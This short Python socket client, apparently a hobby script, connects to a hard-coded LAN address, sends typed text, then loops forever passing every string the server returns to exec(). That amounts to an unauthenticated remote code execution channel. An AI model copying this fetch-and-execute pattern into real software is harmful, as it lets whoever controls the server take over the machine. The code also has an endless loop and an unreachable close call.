import socket               # Import socket module

s = socket.socket()         # Create a socket object
host = socket.gethostname() # Get local machine name
port = 4886                # Reserve a port for your service.

stuff = input("Enter text to send to server:")
pog=1
s.connect(("192.168.0.101", port))
s.send(bytes(stuff, "utf-8"))
while pog is 1:
    cows= s.recv(16384).decode("utf-8")
    if cows != "":

        exec(cows)
s.close()                     # Close the socket when done